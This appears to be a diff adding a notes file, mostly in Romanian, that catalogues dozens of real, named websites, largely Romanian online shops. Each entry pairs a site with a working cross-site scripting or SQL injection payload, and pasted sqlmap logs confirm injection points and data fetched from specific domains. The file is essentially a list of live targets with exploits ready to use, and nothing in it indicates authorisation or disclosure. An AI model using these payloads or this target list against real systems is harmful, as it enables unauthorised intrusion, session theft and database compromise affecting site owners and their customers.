@@ -1,0 +1,166 @@
+https://dopopoco.ro/cautare?query=%3Ciframe%20src=javascript&colon;alert&lpar;document&period;location&rpar;%3E xss audit
+
+https://www.buzzsneakers.com/RON_ro/produse?search=javascript%3A%22%2F*%5C%22%2F*%60%2F*%27+%2F*%3C%2Ftemplate%3E%3C%2Ftextarea%3E%3C%2Fnoembed%3E%3C%2Fnoscript%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Fscript%3E--%3E%26lt%3Bsvg+onload%3D%2F*%3Chtml%2F*%2Fonmouseover%3Dalert%28%29%2F%2F%3E
+
+https://www.bodosport.ro/produse.html?c=389%2z sql injections
+
+https://www.u-man.ro/toate-produsele/?q=%26lt%3BXML+ID%3D%5C%22xss%5C%22%26gt%3B%26lt%3BI%26gt%3B%26lt%3BB%26gt%3B%26lt%3BIMG+SRC%3D%5C%22javas%26lt%3B!--+--%26gt%3Bcript%26%2358%3Balert(%27XSS%27)%5C%22%26gt%3B%26lt%3B%2FB%26gt%3B%26lt%3B%2FI%26gt%3B%26lt%3B%2FXML%26gt%3B
+https://www.bb-shop.ro/cautare.html xss <iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00> categorie de cautat : genti si accesori
+
+http://www.elefant.ro/search?query=%E2%80%98%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%E2%80%99%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%E2%80%9D%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%E2%80%9D%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%E2%80%93%3E%3C%2FSCRIPT%3E%E2%80%9D%3E%E2%80%99%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E xss
+
+http://bby.ro/index.php/catalogsearch/result/?q=%E2%80%98%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%E2%80%99%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%E2%80%9D%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%E2%80%9D%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%E2%80%93%3E%3C%2FSCRIPT%3E%E2%80%9D%3E%E2%80%99%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E xss
+
+https://www.military-shop.ro/catalog?q=%3Cmath+href%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3ECLICKME%3C%2Fmath%3E++%3Cmath%3E+%3Cmaction+actiontype%3D%22statusline%23http%3A%2F%2Fgoogle.com%22+xlink%3Ahref%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3ECLICKME%3C%2Fmaction%3E+%3C%2Fmath%3E XSS
+https://www.toner-shop.ro/lcauta.php?cuvant=1+GROUP+BY+1+HAVING+%271%27+%3D+1 sqlmap
+https://www.acumulator-shop.ro/search?q=%3Cdiv+id%3Dd%3E%3Cx+xmlhttps://www.acumulator-shop.ro/search?q=%22%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%281%29%3E XSS
+00:28:18] [WARNING] it appears that the character '>' is filtered by the back-end server. You are strongly advised to rerun with the '--tamper=between'
+User-Agent parameter 'User-Agent' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+sqlmap identified the following injection point(s) with a total of 3646 HTTP(s) requests:
+---
+Parameter: User-Agent (User-Agent)
+    Type: boolean-based blind
+    Title: MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)
+    Payload: -3915) OR MAKE_SET(4637=4637,7995)-- oKAZ
+---
+[00:28:46] [INFO] the back-end DBMS is MySQL
+web application technology: Apache
+back-end DBMS: MySQL Unknown
+[00:28:46] [WARNING] HTTP error codes detected during run:
+421 (?) - 187 times, 406 (Not Acceptable) - 3455 times
+https://makeupshop.ro/pagina/cauta/%22%3E%3Cimg%20src=x%20onerror=window.open('https://www.google.com/');%3E
+http://shop.brise.ro/ro/cautare/ xss �;alert(String.fromCharCode(88,83,83))//�;alert(String.fromCharCode(88,83,83))//�;alert(String.fromCharCode(88,83,83))//�;alert(String.fromCharCode(88,83,83))//�></SCRIPT>�>�><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+] starting @ 13:50:57 /2019-02-12/
+
+[13:50:58] [INFO] resuming back-end DBMS 'mysql' 
+[13:50:58] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 8169=8169
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+---
+[13:50:58] [INFO] the back-end DBMS is MySQL
+web application technology: PHP 5.3.29, Apache 2.2.34
+back-end DBMS: MySQL >= 5.0.12
+[13:50:58] [INFO] fetched data logged to text files under '/Users/raresban/.sqlmap/output/www.invitatie.ro'
+https://www.baden11.ro/produse/cautare/%3Ciframe%20srcdoc=%22&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;%3E%22%3E
+https://www.orsay.com/ro-ro/search?q=%3Ciframe+srcdoc%3D%27%26lt%3Bbody+onload%3Dprompt%26lpar%3B1%26rpar%3B%26gt%3B%27%3E&lang=ro_RO
+http://www.kingpinshop.ro/index.php?page=home xss <iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
+http://www.vikingshop.ro/search.html cauta <div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
+http://nirashop.ro/s/ka=%3Cscript%3E~'u0061'%20;%20u0074u0068u0072u006Fu0077%20~%20u0074u0068u0069u0073.%20u0061u006Cu0065u0/h=1/ You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'U0061'%;%U0074U0068U0072U006FU0077%~%U0074U0068U0069U0073.%U0061U006CU0065U0%' O' at line 1
+https://www.rosolar-shop.ro/rezultatele-cautarii-p1?keyword=%3Cscript%2Fsrc%3D%22data%26colon%3Btext%252Fj%5Cu0061v%5Cu0061script%2C%5Cu0061lert%28%27%5Cu0061%27%29%22%3E%3C%2Fscript+a%3D%5Cu0061+%26+%2F%3D%252F
+xss https://wrapmamashop.ro/ro/cauta-produse/%3Ciframe+src%3D%22data%3Atext%2Fhtml%2C%253C%2573%2563%2572%2569%2570%2574%253E%2561%256C%2565%2572%2574%2528%2531%2529%253C%252F%2573%2563%2572%2569%2570%2574%253E%22%3E%3C%2Fiframe%3E
+xss https://www.shop.gtcauto.ro/cautare/%3Ciframe%20src=%22javascript:alert('XSS%20by%20/nxss');%22%3E%3C/iframe%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20xss%3C/h1%3E%3C/marquee%3E/
+https://www.ski-shop.ro/catalogsearch/result/?q=%22%3E%3Ch1%3E%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E%22%3E123%3C%2Fh1%3E&order=price "><h1><IFRAME SRC="javascript:alert('XSS');"></IFRAME>">123</h1>
+https://www.misbits.ro/?s=123%27NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2C%2C+OR+1%3D1--
+http://www.mykids.ro/search.php sql injection 123'NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL, OR 1=1--
+http://www.marso.ro/index.php 0\"autofocus/onfocus=alert(1)--><video/poster/ error=prompt(2)>"-confirm(3)-"
+https://www.divertishop.ro/index.php?route=product/search&search=%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+https://farmbee.ro/catalogsearch/result/?q=%22%3E%3C%2Fiframe%3E%3Cscript%3Ealert%28%60TEXT+YOU+WANT+TO+BE+DISPLAYED%60%29%3B%3C%2Fscript%3E%3Ciframe+frameborder%3D%220%25EF%25BB%25BF  "></iframe><script>alert(`TEXT YOU WANT TO BE DISPLAYED`);</script><iframe frameborder="0%EF%BB%BF
+https://fcviitorul.ro/search?s=%3Cimg%20%22%22%22%3E%3Cscript%3Ealert(%22XSS%20by%20%5Cnxss%22)%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20xss%3C%2Fh1%3E%3C%2Fmarquee%3E
+
+Atasez altii 6 clientii(website-uri vulnerabile)
+http://www.steauafc.com/ro/search_results/%3E/%22%3Cscript%3Ealert(1)%3C/script%3E/
+
+https://www.depurtat.ro/catalog?q=%3CIMG+%22%22%22%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%22%3E%3CIMG+%22%22%22%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%22%3E
+
+https://www.bmxmagazin.ro/cautare/?q=%3Ca%2Fhref%3D%22javascript%3A%26%2313%3B+javascript%3Aprompt%281%29%22%3E%3Cinput+type%3D%22X%22%3E
+
+xss <iframe style="position:absolute;top:0;left:0;width:100%;height:100%" 
+onmouseover="prompt(1)"> https://www.listafirme.ro/search.asp
+
+https://www.probeautyshop.ro/cauta/%3Ciframe-src=javascriptalertxss;%3E%3C <IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+
+https://www.kultho.ro/cautare-site.html?q=_iframe_srcdoc___LT_iframe_sol_srcdoc__amp_lt_img_sol_src__amp_apos__amp_apos_onerror_javascript_alert_1__amp_gt____
+ 
+https://www.autoklass-market.ro/masini?filtre=pret_min:/*iframe/src*/%3Ciframe/src=%22%3Ciframe/src=@%22/onload=prompt(1)+/*iframe/src*/%3E|km_min:/*iframe/src*/%3Ciframe/src=%22%3Ciframe/src=@%22/onload=prompt(1)+/*iframe/src*/%3E|cc_min:/*iframe/src*/%3Ciframe/src=%22%3Ciframe/src=@%22/onload=prompt(1)+/*iframe/src*/%3E
+
+
+Alte 5
+
+https://teamdeals.ro/cautare/-scriptsvg-x-onloadcou006efirm?q=-scriptsvg-x-onloadcou006efirm
+
+http://www.frkarate.ro/cauta?q=%3C%22%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E
+
+https://www.bbcollection.ro/cautare-site.html?q=_iframe_src_j_Tab_a_Tab_v_Tab_a_Tab_s_Tab_c_Tab_r_Tab_i_Tab_p_Tab_t_Tab__a_Tab_l_Tab_e_Tab_r_Tab_t_Tab__28_Tab_1_Tab__29___iframe_
+
+https://www.atriummall.ro/branduri/andini-karting-experience/ <iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
+
+https://www.revista-ferma.ro/cauta?searchtext=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&go_search=
+
+https://www.xixi.ro/search?key=%3E%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E&search=
+
+https://www.laso.ro/cauta-saloane/nume in cauta pe homepage are parametru si e vuln la basic xss >”<script>alert(1)</script>
+
+https://www.agroinfo.ro/cauta?searchtext=--%3E%27%22%2F%3E%3C%2FsCript%3E%3CsvG+x%3D%22%3E%22+onload%3D%28co%5Cu006efirm%29%60%60%3E&go_search=
+
+
+
+Inca alti 5
+
+http://213.233.74.97/Forms/login1 ‘;alert(String.fromCharCode(88,83,83))//’;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//–></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+
+http://www.govisitisrael.com/searchresults.php XSS SIMPLU SQL
+http://www.hotelcrisanaarad.ro/galerieFoto.php?id=34%27 SQL xss
+https://www.imovest.eu/p.php?id=1 sql
+https://www.imotrustarad.ro/ xss
+
+Alte 12
+www.ticketnet.ro/event.php?id= xss payloads
+www.hotelmaxim.ro/index.php?lang= xss payload
+GET parameter 'query' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+sqlmap identified the following injection point(s) with a total of 208 HTTP(s) requests:
+---
+Parameter: query (GET)
+	Type: boolean-based blind
+	Title: OR boolean-based blind - WHERE or HAVING clause
+	Payload: query=-5525 OR 2708=2708
+---
+[12:38:36] [INFO] testing SQLite
+[12:38:37] [WARNING] the back-end DBMS is not SQLite
+[12:38:37] [INFO] testing MySQL
+[12:38:37] [INFO] confirming MySQL
+[12:38:38] [INFO] the back-end DBMS is MySQL
+web application technology: Servlet 3.0
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+[12:38:38] [WARNING] HTTP error codes detected during run:
+403 (Forbidden) - 187 times, 404 (Not Found) - 3 times
+[12:38:38] [INFO] fetched data logged to text files under '/home/pwn/.sqlmap/output/www.ikea.com'
+
+[*] shutting down at 12:38:38
+
+https://musette.ro/ro/catalogsearch/result/?q=%3Ciframe+src%3D%22data%3Atext%2Fhtml%2C%253C%2573%2563%2572%2569%2570%2574%253E%2561%256C%2565%2572%2574%2528%2531%2529%253C%252F%2573%2563%2572%2569%2570%2574%253E%22%3E%3C%2Fiframe%3E
+
+https://www.bigotti.ro/frontend/filters?filter=20&search=335013&search_word=%22%3E%3Cmarquee/onstart=confirm(1)%3E
+
+http://www.cofetariacodrina.ro/roti%C8%9Be-cu-gem-de-post-387.html?c=22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+
+https://www.zoot.ro/cautare/q/%3Ca%20aa%20aaa%20aaaa%20aaaaa%20aaaaaa%20aaaaaaa%20aaaaaaaa%20aaaaaaaaa%20aaaaaaaaaa%20href=j%26%2397v%26%2397script%26%23x3A;%26%2397lert%281%29%3EClickMe
+
+https://www.puratos.ro/ro/search.html?search=%3E%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+
+https://www.anuntul.ro/anunturi/?search%5Bquery%5D=%3E%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+
+https://www.historia.ro/cautare/%3Ciframe%20srcdoc='&lt;body%20onload=prompt&lpar;1&rpar;&gt;'%3E
+
+https://www.amway.ro/en/ search <iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
+ Payload
+
+https://www.arteiasi.ro/?s=%3E%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+
+Azi 4
+http://www.frt.ro/ro/rezultat_cauta_jucator xss simplu
+
+https://www.comati-psg.ro/ro/Transport-Suedia-autocar-Danemarca-tranport-international-Scandinavia.html xss simplu
+
+https://www.sportvision.ro/produse?search=;alert(String.fromCharCode(88,83,83))//\%27;alert(String.fromCharCode(88,83,83))//%22;alert(String.fromCharCode(88,83,83))//\%22;alert(String.fromCharCode(88,83,83))//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert(String.fromCharCode(88,83,83))%3C/SCRIPT%3E
+
+https://www.citgrup.ro/index.php?page=search&search=%3Ciframe%2Fsrc%3D%22data%3Atext%2Fhtml%2C%3Csvg+%26%23111%3B%26%23110%3Bload%3Dalert%281%29%3E%22%3E
+
+http://www.euroinst.ro/titlu.php?id=1068’ sql injection
